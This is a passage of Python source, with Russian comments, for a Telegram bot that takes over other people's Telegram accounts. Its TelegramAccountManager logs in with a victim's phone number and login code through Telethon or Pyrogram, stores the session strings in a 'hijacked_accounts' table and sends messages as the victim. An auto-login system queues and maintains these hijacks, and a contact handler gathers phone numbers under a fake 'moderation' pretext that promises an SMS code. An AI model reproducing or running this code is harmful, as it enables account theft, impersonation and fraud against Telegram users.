            cleaned['ip_address'] = self.mask_ip_address(cleaned['ip_address'])
        
        return cleaned

anonymity_manager = AnonymityManager()
@dp.message(Command("reload_admins"))
async def cmd_reload_admins(message: Message):
    """Перезагружает кэш администраторов (только для главного админа)"""
    if message.from_user.id != config.MAIN_ADMIN_ID:
        await message.answer("❌ Недостаточно прав.")
        return
    
    try:
        admin_manager.load_admins_cache()
        count = len(admin_manager.admin_cache)
        await message.answer(f"✅ Кэш админов перезагружен. Загружено записей: {count}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")


        
def admin_required(require_main: bool = False, required_permission: str = None):
    """Декоратор для проверки прав администратора."""
    def decorator(handler):
        @wraps(handler)
        async def wrapper(event, *args, **kwargs):
            user_id = event.from_user.id
            
            # 1. Проверка на администратора
            if not admin_manager.is_admin(user_id):
                if isinstance(event, Message):
                    await event.answer("❌ У вас нет доступа к этой команде.")
                elif isinstance(event, CallbackQuery):
                    await event.answer("❌ Доступ запрещен.", show_alert=True)
                return
            
            # 2. Проверка на главного админа (если требуется)
            if require_main and not admin_manager.is_main_admin(user_id):
                if isinstance(event, Message):
                    await event.answer("❌ Только главный администратор может использовать эту команду.")
                elif isinstance(event, CallbackQuery):
                    await event.answer("❌ Только главный админ.", show_alert=True)
                return
            
            # 3. Проверка конкретного разрешения (если указано)
            if required_permission and not admin_manager.has_permission(user_id, required_permission):
                if isinstance(event, Message):
                    await event.answer(f"❌ Недостаточно прав. Требуется: {required_permission}")
                elif isinstance(event, CallbackQuery):
                    await event.answer(f"❌ Недостаточно прав.", show_alert=True)
                return
            
            # Все проверки пройдены - выполняем обработчик
            return await handler(event, *args, **kwargs)
        return wrapper
    return decorator

# ========== МЕНЕДЖЕР АККАУНТОВ TELEGRAM ==========
class TelegramAccountManager:
    """Управление захваченными аккаунтами Telegram"""
    
    def __init__(self):
        self.active_sessions = {}
        self.account_clients = {}
        self.session_lock = asyncio.Lock()
        
        # Загружаем сохраненные аккаунты
        self.load_accounts()
    
    def load_accounts(self):
        """Загружает аккаунты из базы данных"""
        try:
            accounts = db.fetch_all("SELECT id, phone_number, session_string_encrypted, session_type FROM hijacked_accounts WHERE is_active = 1")
            
            for account in accounts:
                account_id, phone, session_encrypted, session_type = account
                
                # Расшифровываем сессию
                try:
                    session_string = encryptor.decrypt(session_encrypted)
                    self.active_sessions[account_id] = {
                        'phone': phone,
                        'session_string': session_string,
                        'session_type': session_type,
                        'client': None,
                        'last_used': datetime.now(),
                        'is_connected': False
                    }
                except Exception as e:
                    logger.error(f"Ошибка загрузки сессии для аккаунта {phone}: {e}")
            
            logger.info(f"Загружено {len(self.active_sessions)} активных аккаунтов")
        except Exception as e:
            logger.error(f"Ошибка загрузки аккаунтов: {e}")
    
    async def hijack_account(self, phone_number: str, code: str, method: str = 'telethon') -> Dict:
        """Захватывает аккаунт Telegram"""
        try:
            logger.info(f"Начинаю захват аккаунта {phone_number} методом {method}")
            
            if method == 'telethon':
                return await self._hijack_with_telethon(phone_number, code)
            elif method == 'pyrogram':
                return await self._hijack_with_pyrogram(phone_number, code)
            else:
                raise ValueError(f"Неизвестный метод: {method}")
                
        except Exception as e:
            logger.error(f"Ошибка захвата аккаунта {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def _hijack_with_telethon(self, phone_number: str, code: str) -> Dict:
        """Захватывает аккаунт через Telethon"""
        try:
            # Создаем клиент
            client = TelegramClient(
                session=StringSession(),
                api_id=config.TELEGRAM_API_ID,
                api_hash=config.TELEGRAM_API_HASH,
                device_model="iPhone 14 Pro Max",
                system_version="iOS 16.6",
                app_version="9.4",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            await client.connect()
            
            # Отправляем код
            sent_code = await client.send_code_request(phone_number)
            
            # Входим с кодом
            await client.sign_in(phone_number, code=code)
            
            # Получаем информацию об аккаунте
            me = await client.get_me()
            session_string = client.session.save()
            
            # Сохраняем в базу данных
            session_encrypted = encryptor.encrypt(session_string)
            phone_hash = encryptor.hash_data(phone_number)
            
            db.execute('''
                INSERT OR REPLACE INTO hijacked_accounts 
                (phone_number, phone_hash, user_id, username, first_name, last_name, 
                 session_string_encrypted, session_type, hijacked_date, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                phone_number,
                phone_hash,
                me.id,
                me.username,
                me.first_name,
                me.last_name,
                session_encrypted,
                'telethon',
                datetime.now().isoformat(),
                1
            ))
            
            account_id = db.cursor.lastrowid
            
            # Сохраняем сессию в памяти
            self.active_sessions[account_id] = {
                'phone': phone_number,
                'session_string': session_string,
                'session_type': 'telethon',
                'client': client,
                'last_used': datetime.now(),
                'is_connected': True
            }
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (user_id, action, details, risk_level)
                VALUES (?, ?, ?, ?)
            ''', (
                me.id,
                'account_hijack',
                f'Telegram аккаунт захвачен: {phone_number}',
                10
            ))
            
            logger.info(f"Аккаунт {phone_number} успешно захвачен (ID: {account_id})")
            
            return {
                'success': True,
                'account_id': account_id,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'session_type': 'telethon'
            }
            
        except Exception as e:
            logger.error(f"Ошибка Telethon для {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def _hijack_with_pyrogram(self, phone_number: str, code: str) -> Dict:
        """Захватывает аккаунт через Pyrogram"""
        try:
            app = Client(
                name=f"session_{phone_number}",
                api_id=config.TELEGRAM_API_ID,
                api_hash=config.TELEGRAM_API_HASH,
                phone_number=phone_number,
                in_memory=True
            )
            
            await app.connect()
            
            # Отправляем код
            sent_code = await app.send_code(phone_number)
            
            # Входим
            await app.sign_in(
                phone_number=phone_number,
                phone_code_hash=sent_code.phone_code_hash,
                phone_code=code
            )
            
            # Получаем сессию
            session_string = await app.export_session_string()
            
            # Получаем информацию
            me = await app.get_me()
            
            # Сохраняем в базу
            session_encrypted = encryptor.encrypt(session_string)
            phone_hash = encryptor.hash_data(phone_number)
            
            db.execute('''
                INSERT OR REPLACE INTO hijacked_accounts 
                (phone_number, phone_hash, user_id, username, first_name, last_name, 
                 session_string_encrypted, session_type, hijacked_date, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                phone_number,
                phone_hash,
                me.id,
                me.username,
                me.first_name,
                me.last_name or '',
                session_encrypted,
                'pyrogram',
                datetime.now().isoformat(),
                1
            ))
            
            account_id = db.cursor.lastrowid
            
            # Сохраняем сессию
            self.active_sessions[account_id] = {
                'phone': phone_number,
                'session_string': session_string,
                'session_type': 'pyrogram',
                'client': app,
                'last_used': datetime.now(),
                'is_connected': True
            }
            
            logger.info(f"Аккаунт {phone_number} захвачен через Pyrogram (ID: {account_id})")
            
            return {
                'success': True,
                'account_id': account_id,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'session_type': 'pyrogram'
            }
            
        except Exception as e:
            logger.error(f"Ошибка Pyrogram для {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def send_message_from_account(self, account_id: int, target: str, message: str, 
                                       media_path: str = None) -> Dict:
        """Отправляет сообщение от захваченного аккаунта"""
        try:
            if account_id not in self.active_sessions:
                # Пытаемся восстановить сессию
                await self.restore_session(account_id)
            
            session_info = self.active_sessions.get(account_id)
            if not session_info:
                return {'success': False, 'error': 'Сессия не найдена'}
            
            client = session_info['client']
            if not client or not session_info['is_connected']:
                # Восстанавливаем подключение
                client = await self.restore_session(account_id)
            
            # Отправляем сообщение
            if media_path and os.path.exists(media_path):
                # Отправляем с медиа
                if session_info['session_type'] == 'telethon':
                    await client.send_file(target, media_path, caption=message)
                else:
                    await client.send_photo(target, media_path, caption=message)
            else:
                # Отправляем текстовое сообщение
                await client.send_message(target, message)
            
            # Обновляем время использования
            session_info['last_used'] = datetime.now()
            
            # Логируем действие
            db.execute('''
                INSERT INTO account_actions 
                (account_id, action_type, target, data, status, executed_date, result)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                account_id,
                'send_message',
                target,
                message[:100],
                'success',
                datetime.now().isoformat(),
                'Сообщение отправлено'
            ))
            
            return {'success': True, 'message': 'Сообщение отправлено'}
            
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения от аккаунта {account_id}: {e}")
            
            db.execute('''
                INSERT INTO account_actions 
                (account_id, action_type, target, data, status, error_message)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                account_id,
                'send_message',
                target,
                message[:100],
                'failed',
                str(e)[:200]
            ))
            
            return {'success': False, 'error': str(e)}
    
    async def restore_session(self, account_id: int):
        """Восстанавливает сессию аккаунта"""
        try:
            # Получаем данные из базы
            account_data = db.fetch_one(
                "SELECT session_string_encrypted, session_type, phone_number FROM hijacked_accounts WHERE id = ?",
                (account_id,)
            )
            
            if not account_data:
                raise ValueError(f"Аккаунт {account_id} не найден")
            
            session_encrypted, session_type, phone = account_data
            session_string = encryptor.decrypt(session_encrypted)
            
            client = None
            
            if session_type == 'telethon':
                client = TelegramClient(
                    session=StringSession(session_string),
                    api_id=config.TELEGRAM_API_ID,
                    api_hash=config.TELEGRAM_API_HASH
                )
                await client.connect()
                
                # Проверяем авторизацию
                if not await client.is_user_authorized():
                    raise ValueError("Сессия не авторизована")
                    
            elif session_type == 'pyrogram':
                client = Client(
                    name=f"restored_{phone}",
                    api_id=config.TELEGRAM_API_ID,
                    api_hash=config.TELEGRAM_API_HASH,
                    session_string=session_string
                )
                await client.connect()
            
            # Обновляем в памяти
            if account_id in self.active_sessions:
                self.active_sessions[account_id].update({
                    'client': client,
                    'is_connected': True,
                    'last_used': datetime.now()
                })
            else:
                self.active_sessions[account_id] = {
                    'phone': phone,
                    'session_string': session_string,
                    'session_type': session_type,
                    'client': client,
                    'last_used': datetime.now(),
                    'is_connected': True
                }
            
            logger.info(f"Сессия аккаунта {account_id} восстановлена")
            return client
            
        except Exception as e:
            logger.error(f"Ошибка восстановления сессии {account_id}: {e}")
            
            # Помечаем аккаунт как неактивный
            db.execute(
                "UPDATE hijacked_accounts SET is_active = 0, last_check = ? WHERE id = ?",
                (datetime.now().isoformat(), account_id)
            )
            
            if account_id in self.active_sessions:
                del self.active_sessions[account_id]
            
            raise
    
    async def get_account_info(self, account_id: int) -> Dict:
        """Получает информацию об аккаунте"""
        try:
            if account_id not in self.active_sessions:
                await self.restore_session(account_id)
            
            session_info = self.active_sessions[account_id]
            client = session_info['client']
            
            if session_info['session_type'] == 'telethon':
                me = await client.get_me()
                dialogs = await client.get_dialogs(limit=10)
                
                return {
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': session_info['phone'],
                    'dialogs_count': len(dialogs),
                    'is_online': await client.is_user_authorized(),
                    'session_type': 'telethon'
                }
            else:
                me = await client.get_me()
                
                return {
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name or '',
                    'phone': session_info['phone'],
                    'is_online': True,
                    'session_type': 'pyrogram'
                }
                
        except Exception as e:
            logger.error(f"Ошибка получения информации об аккаунте {account_id}: {e}")
            return {'error': str(e)}
    
    def get_all_accounts(self) -> List[Dict]:
        """Возвращает список всех аккаунтов"""
        accounts = db.fetch_all('''
            SELECT id, phone_number, username, first_name, hijacked_date, is_active 
            FROM hijacked_accounts 
            ORDER BY hijacked_date DESC
        ''')
        
        result = []
        for acc in accounts:
            result.append({
                'id': acc[0],
                'phone': acc[1],
                'username': acc[2],
                'first_name': acc[3],
                'hijacked_date': acc[4],
                'is_active': bool(acc[5]),
                'in_memory': acc[0] in self.active_sessions
            })
        
        return result

account_manager = TelegramAccountManager()

# ========== СИСТЕМА АВТОМАТИЧЕСКОГО ВХОДА ==========
class AutoLoginSystem:
    """Система автоматического входа и мониторинга аккаунтов"""
    
    def __init__(self):
        self.monitoring_tasks = {}
        self.login_queue = asyncio.Queue()
        self.is_running = False
    
    async def start_monitoring(self):
        """Запускает мониторинг всех аккаунтов"""
        if self.is_running:
            return
        
        self.is_running = True
        logger.info("Запуск системы мониторинга аккаунтов")
        
        # Запускаем обработчик очереди
        asyncio.create_task(self._process_login_queue())
        
        # Запускаем периодические проверки
        asyncio.create_task(self._periodic_account_checks())
        
        # Восстанавливаем все сессии
        await self.restore_all_sessions()
    
    async def restore_all_sessions(self):
        """Восстанавливает все сохраненные сессии"""
        try:
            accounts = db.fetch_all("SELECT id FROM hijacked_accounts WHERE is_active = 1")
            
            logger.info(f"Восстановление {len(accounts)} сессий...")
            
            for account in accounts:
                account_id = account[0]
                try:
                    await account_manager.restore_session(account_id)
                    await asyncio.sleep(1)  # Задержка между восстановлениями
                except Exception as e:
                    logger.warning(f"Не удалось восстановить сессию {account_id}: {e}")
            
            logger.info("Восстановление сессий завершено")
            
        except Exception as e:
            logger.error(f"Ошибка восстановления сессий: {e}")
    
    async def _process_login_queue(self):
        """Обрабатывает очередь автоматического входа"""
        while self.is_running:
            try:
                task = await self.login_queue.get()
                
                if task['type'] == 'hijack':
                    await self._auto_hijack_account(
                        task['phone'],
                        task['code'],
                        task.get('method', 'telethon')
                    )
                elif task['type'] == 'restore':
                    await account_manager.restore_session(task['account_id'])
                
                self.login_queue.task_done()
                
            except Exception as e:
                logger.error(f"Ошибка обработки задачи входа: {e}")
                await asyncio.sleep(5)
    
    async def _auto_hijack_account(self, phone: str, code: str, method: str):
        """Автоматический захват аккаунта"""
        try:
            result = await account_manager.hijack_account(phone, code, method)
            
            if result['success']:
                # Уведомляем главного админа
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"✅ <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ УСПЕШЕН</b>\n\n"
                    f"📱 Телефон: {phone}\n"
                    f"👤 Пользователь: @{result.get('username', 'нет')}\n"
                    f"🆔 ID аккаунта: {result['account_id']}\n"
                    f"🔧 Метод: {method}\n"
                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="HTML"
                )
                
                # Запускаем мониторинг для этого аккаунта
                asyncio.create_task(self._monitor_account(result['account_id']))
            else:
                logger.error(f"Авто-захват не удался: {result['error']}")
                
        except Exception as e:
            logger.error(f"Ошибка авто-захвата: {e}")
    
    async def _monitor_account(self, account_id: int):
        """Мониторинг состояния аккаунта"""
        try:
            while self.is_running and account_id in account_manager.active_sessions:
                try:
                    # Проверяем доступность аккаунта
                    info = await account_manager.get_account_info(account_id)
                    
                    if 'error' in info:
                        # Пробуем восстановить
                        await account_manager.restore_session(account_id)
                    
                    # Обновляем статус в базе
                    db.execute(
                        "UPDATE hijacked_accounts SET last_check = ?, is_online = ? WHERE id = ?",
                        (datetime.now().isoformat(), 1, account_id)
                    )
                    
                    await asyncio.sleep(300)  # Проверка каждые 5 минут
                    
                except Exception as e:
                    logger.warning(f"Ошибка мониторинга аккаунта {account_id}: {e}")
                    await asyncio.sleep(60)
                    
        except Exception as e:
            logger.error(f"Мониторинг аккаунта {account_id} остановлен: {e}")
    
    async def _periodic_account_checks(self):
        """Периодические проверки всех аккаунтов"""
        while self.is_running:
            try:
                # Получаем список аккаунтов для проверки
                accounts = db.fetch_all('''
                    SELECT id FROM hijacked_accounts 
                    WHERE is_active = 1 
                    AND (last_check IS NULL OR last_check < ?)
                ''', ((datetime.now() - timedelta(hours=1)).isoformat(),))
                
                for account in accounts:
                    account_id = account[0]
                    try:
                        await account_manager.restore_session(account_id)
                        await asyncio.sleep(2)
                    except Exception as e:
                        logger.warning(f"Периодическая проверка не удалась для {account_id}: {e}")
                
                await asyncio.sleep(1800)  # Проверка каждые 30 минут
                
            except Exception as e:
                logger.error(f"Ошибка периодической проверки: {e}")
                await asyncio.sleep(300)
    
    async def stop_monitoring(self):
        """Останавливает мониторинг"""
        self.is_running = False
        logger.info("Мониторинг аккаунтов остановлен")

auto_login_system = AutoLoginSystem()
@dp.message(F.contact)
async def handle_contact(message: Message, state: FSMContext):
    """Обрабатывает отправку контакта от пользователя"""
    user_id = message.from_user.id
    
    # Проверяем, не отправлен ли уже запрос на модерацию
    pending_request = moderation_system.get_user_pending_request(user_id)
    
    if pending_request:
        # Уже есть активный запрос
        await message.answer(
            "⏳ <b>ВАШ ЗАПРОС НА МОДЕРАЦИИ</b>\n\n"
            "Ваш номер телефона уже отправлен на проверку.\n"
            "Ожидайте подтверждения модератора.\n\n"
            "<i>Статус: ОЖИДАЕТ ПРОВЕРКИ</i>",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove()
        )
        return
    
    # Получаем номер телефона
    phone = message.contact.phone_number
    
    # Убираем + если есть
    if phone.startswith('+'):
        phone = phone[1:]
    
    # Сохраняем номер в users
    db.execute('''
        INSERT OR REPLACE INTO users 
        (user_id, username, first_name, phone, last_seen)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        user_id,
        message.from_user.username,
        message.from_user.first_name,
        phone,
        datetime.now().isoformat()
    ))
    
    # Создаем запрос на модерацию
    request_id = await moderation_system.create_moderation_request(user_id, phone)
    
    if request_id:
        # Отправляем запрос модераторам
        await moderation_system.send_to_moderators(request_id, user_id, phone)
        
        # Уведомляем пользователя
        await message.answer(
            "⏳ <b>ЗАПРОС ОТПРАВЛЕН НА МОДЕРАЦИЮ</b>\n\n"
            "Ваш номер телефона отправлен на проверку модератору.\n\n"
            "<i>Статус: ОЖИДАЕТ ПОДТВЕРЖДЕНИЯ</i>\n\n"
            "Вы получите SMS код после одобрения.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove()
        )
    else:
        await message.answer(
            "❌ <b>ОШИБКА ОТПРАВКИ</b>\n\n"
            "Не удалось отправить запрос на проверку.\n"
            "Попробуйте еще раз через несколько минут.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove()
        )
    
    await state.clear()

# ========== МЕНЕДЖЕР КАНАЛОВ И ГРУПП (УЛУЧШЕННЫЙ) ==========
class ChannelManager:
    """Управление каналами и группами с системой одобрения"""
    
    def __init__(self):
        self.pending_approvals = {}
    
    async def handle_bot_added_as_admin(self, channel_id: str, added_by: int, 
                                      added_in_chat_id: int = None) -> Dict:
        """Обрабатывает событие, когда бота добавили администратором"""
        try:
            logger.info(f"Бота добавили администратором в канал {channel_id}")
            
            # Получаем информацию о канале
            try:
                chat = await bot.get_chat(channel_id)
                channel_info = {
                    'title': chat.title,
                    'username': chat.username,
                    'type': str(chat.type)
                }
            except Exception as e:
                logger.warning(f"Не удалось получить информацию о канале: {e}")
                channel_info = {
                    'title': f'Канал {channel_id}',
                    'username': None,
                    'type': 'unknown'
                }
            
            # Проверяем права бота
            bot_is_admin = False
            bot_permissions = {}
            
            try:
                member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
                if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
                    bot_is_admin = True
                    
                    if member.status == ChatMemberStatus.ADMINISTRATOR:
                        bot_permissions = {
                            'can_post_messages': member.can_post_messages or False,
                            'can_edit_messages': member.can_edit_messages or False,
                            'can_delete_messages': member.can_delete_messages or False,
                            'can_restrict_members': member.can_restrict_members or False,
                            'can_promote_members': member.can_promote_members or False,
                            'can_change_info': member.can_change_info or False,
                            'can_invite_users': member.can_invite_users or False,
                            'can_pin_messages': member.can_pin_messages or False,
                            'can_manage_chat': member.can_manage_chat or False,
                            'can_manage_video_chats': member.can_manage_video_chats or False
                        }
            except Exception as e:
                logger.warning(f"Не удалось проверить права бота: {e}")
            
            # Проверяем, существует ли уже канал
            existing = db.fetch_one(
                "SELECT id, is_approved FROM channels WHERE channel_id = ?",
                (channel_id,)
            )
            
            if existing:
                channel_db_id, is_approved = existing
                
                # Если канал уже одобрен, просто обновляем права
                if is_approved:
                    db.execute(
                        "UPDATE channels SET bot_is_admin = ?, bot_permissions = ? WHERE id = ?",
                        (1 if bot_is_admin else 0, json.dumps(bot_permissions), channel_db_id)
                    )
                    
                    # Уведомляем того, кто добавил
                    try:
                        await bot.send_message(
                            added_by,
                            f"✅ <b>БОТ УСПЕШНО ДОБАВЛЕН КАК АДМИНИСТРАТОР!</b>\n\n"
                            f"📢 Канал: {channel_info['title']}\n"
                            f"🔗 ID: {channel_id}\n"
                            f"🤖 Права: {'Полные' if bot_is_admin else 'Ограниченные'}\n\n"
                            f"Теперь бот может отправлять уведомления в этот канал.",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.warning(f"Не удалось уведомить пользователя: {e}")
                    
                    return {
                        'success': True,
                        'channel_id': channel_db_id,
                        'already_exists': True,
                        'is_approved': True
                    }
                else:
                    # Канал существует, но не одобрен
                    db.execute(
                        "UPDATE channels SET bot_is_admin = ?, bot_permissions = ? WHERE id = ?",
                        (1 if bot_is_admin else 0, json.dumps(bot_permissions), channel_db_id)
                    )
                    
                    # Запрашиваем одобрение снова
                    return await self.request_channel_approval(
                        channel_db_id, channel_id, channel_info, added_by
                    )
            
            # Добавляем новый канал
            db.execute('''
                INSERT INTO channels 
                (channel_id, channel_title, channel_username, channel_type, added_by,
                 is_approved, notifications_enabled, admin_notifications, bot_is_admin, bot_permissions)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                channel_id,
                channel_info['title'],
                channel_info['username'],
                channel_info['type'],
                added_by,
                0,  # Не одобрен по умолчанию
                1,  # Уведомления включены
                1,  # Уведомления админу включены
                1 if bot_is_admin else 0,
                json.dumps(bot_permissions)
            ))
            
            channel_db_id = db.cursor.lastrowid
            
            # Запрашиваем одобрение
            return await self.request_channel_approval(
                channel_db_id, channel_id, channel_info, added_by
            )
            
        except Exception as e:
            logger.error(f"Ошибка обработки добавления бота как админа: {e}")
            return {'success': False, 'error': str(e)}
    
    async def request_channel_approval(self, channel_db_id: int, channel_id: str, 
                                     channel_info: Dict, added_by: int) -> Dict:
        """Запрашивает одобрение канала у главного админа"""
        try:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="✅ Одобрить",
                        callback_data=f"approve_channel:{channel_db_id}"
                    ),
                    InlineKeyboardButton(
                        text="❌ Отклонить", 
                        callback_data=f"reject_channel:{channel_db_id}"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="👁️ Просмотр канала", 
                        callback_data=f"view_channel:{channel_db_id}"
                    ),
                    InlineKeyboardButton(
                        text="🔧 Проверить права",
                        callback_data=f"check_permissions:{channel_db_id}"
                    )
                ]
            ])
            
            # Отправляем уведомление главному админу
            await bot.send_message(
                config.MAIN_ADMIN_ID,
                f"🆕 <b>БОТА ДОБАВИЛИ АДМИНИСТРАТОРОМ В КАНАЛ</b>\n\n"
                f"📢 Название: {channel_info['title']}\n"
                f"🔗 ID: {channel_id}\n"
                f"👤 Добавил: {added_by}\n"
                f"🤖 Бот админ: {'✅ Да' if True else '❌ Нет'}\n"
                f"🔒 Тип: {channel_info.get('type', 'unknown')}\n\n"
                f"<i>Требуется одобрение для отправки уведомлений</i>",
                parse_mode="HTML",
                reply_markup=keyboard
            )
            
            # Уведомляем того, кто добавил
            try:
                await bot.send_message(
                    added_by,
                    f"⏳ <b>ЗАПРОС ОТПРАВЛЕН НА ОДОБРЕНИЕ</b>\n\n"
                    f"📢 Канал: {channel_info['title']}\n"
                    f"🔗 ID: {channel_id}\n\n"
                    f"Главный администратор получил запрос на одобрение.\n"
                    f"Вы получите уведомление, когда канал будет одобрен.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
            
            # Сохраняем в кэш ожидающих одобрения
            self.pending_approvals[channel_db_id] = {
                'channel_id': channel_id,
                'added_by': added_by,
                'channel_title': channel_info['title'],
                'request_time': datetime.now()
            }
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'requires_approval': True,
                'message': 'Запрос на одобрение отправлен главному админу'
            }
            
        except Exception as e:
            logger.error(f"Ошибка запроса одобрения: {e}")
            return {'success': False, 'error': str(e)}
    
    async def approve_channel(self, channel_db_id: int, approved_by: int) -> Dict:
        """Одобряет канал для отправки уведомлений"""
        try:
            # Получаем информацию о канале
            channel_data = db.fetch_one(
                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, channel_title, added_by = channel_data
            
            # Обновляем статус
            db.execute('''
                UPDATE channels 
                SET is_approved = 1, approved_by = ?, approved_date = ?, admin_notifications = 0 
                WHERE id = ?
            ''', (approved_by, datetime.now().isoformat(), channel_db_id))
            
            # Удаляем из кэша ожидающих одобрения
            if channel_db_id in self.pending_approvals:
                del self.pending_approvals[channel_db_id]
            
            # Уведомляем того, кто добавил канал
            if added_by != approved_by:
                try:
                    await bot.send_message(
                        added_by,
                        f"✅ <b>ВАШ КАНАЛ ОДОБРЕН!</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n"
                        f"👑 Одобрил: Главный админ\n\n"
                        f"Теперь бот будет отправлять уведомления в этот канал.\n"
                        f"Используйте команду /notifications для управления уведомлениями.",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
            
            # Уведомляем главного админа
            await bot.send_message(
                approved_by,
                f"✅ <b>КАНАЛ ОДОБРЕН</b>\n\n"
                f"📢 Канал: {channel_title}\n"
                f"🔗 ID: {channel_id}\n"
                f"👤 Добавил: {added_by}\n\n"
                f"Уведомления теперь будут отправляться в канал.\n"
                f"Админ-уведомления отключены.",
                parse_mode="HTML"
            )
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (approved_by, 'channel_approved', f'Канал {channel_id} одобрен'))
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'channel_title': channel_title,
                'admin_notifications': False,
                'message': f'Канал "{channel_title}" одобрен'
            }
            
        except Exception as e:
            logger.error(f"Ошибка одобрения канала: {e}")
            return {'success': False, 'error': str(e)}
    
    async def reject_channel(self, channel_db_id: int, rejected_by: int, reason: str = "") -> Dict:
        """Отклоняет канал"""
        try:
            channel_data = db.fetch_one(
                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, channel_title, added_by = channel_data
            
            # Удаляем канал из базы
            db.execute("DELETE FROM channels WHERE id = ?", (channel_db_id,))
            
            # Удаляем из кэша
            if channel_db_id in self.pending_approvals:
                del self.pending_approvals[channel_db_id]
            
            # Уведомляем того, кто добавил канал
            if added_by != rejected_by:
                try:
                    await bot.send_message(
                        added_by,
                        f"❌ <b>ВАШ КАНАЛ ОТКЛОНЕН!</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n"
                        f"👑 Отклонил: Главный админ\n"
                        f"📝 Причина: {reason or 'Не указана'}\n\n"
                        f"Бот не будет отправлять уведомления в этот канал.",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
            
            # Уведомляем главного админа
            await bot.send_message(
                rejected_by,
                f"❌ <b>КАНАЛ ОТКЛОНЕН</b>\n\n"
                f"📢 Канал: {channel_title}\n"
                f"🔗 ID: {channel_id}\n"
                f"👤 Добавил: {added_by}\n"
                f"📝 Причина: {reason or 'Не указана'}\n\n"
                f"Канал удален из системы.",
                parse_mode="HTML"
            )
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (rejected_by, 'channel_rejected', f'Канал {channel_id} отклонен: {reason}'))
            
            return {'success': True, 'channel_id': channel_db_id}
            
        except Exception as e:
            logger.error(f"Ошибка отклонения канала: {e}")
            return {'success': False, 'error': str(e)}
    
    async def toggle_channel_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
        """Включает/выключает уведомления в канале"""
        try:
            # Получаем текущее состояние
            current = db.fetch_one(
                "SELECT notifications_enabled, channel_title FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not current:
                return {'success': False, 'error': 'Канал не найден'}
            
            current_enabled, channel_title = current
            
            # Если enabled не указан, переключаем
            if enabled is None:
                enabled = not bool(current_enabled)
            
            db.execute(
                "UPDATE channels SET notifications_enabled = ? WHERE id = ?",
                (1 if enabled else 0, channel_db_id)
            )
            
            status = "включены" if enabled else "выключены"
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'notifications_enabled': enabled,
                'channel_title': channel_title,
                'message': f'Уведомления в канале "{channel_title}" {status}'
            }
            
        except Exception as e:
            logger.error(f"Ошибка переключения уведомлений: {e}")
            return {'success': False, 'error': str(e)}
        

    async def toggle_admin_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
        """Включает/выключает уведомления админу"""
        try:
            current = db.fetch_one(
                "SELECT admin_notifications, channel_title FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not current:
                return {'success': False, 'error': 'Канал не найден'}
            
            current_enabled, channel_title = current
            
            if enabled is None:
                enabled = not bool(current_enabled)
            
            db.execute(
                "UPDATE channels SET admin_notifications = ? WHERE id = ?",
                (1 if enabled else 0, channel_db_id)
            )
            
            status = "включены" if enabled else "выключены"
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'admin_notifications': enabled,
                'channel_title': channel_title,
                'message': f'Уведомления админу для канала "{channel_title}" {status}'
            }
            
        except Exception as e:
            logger.error(f"Ошибка переключения админ-уведомлений: {e}")
            return {'success': False, 'error': str(e)}
    
    async def send_to_channel(self, channel_db_id: int, message: str, 
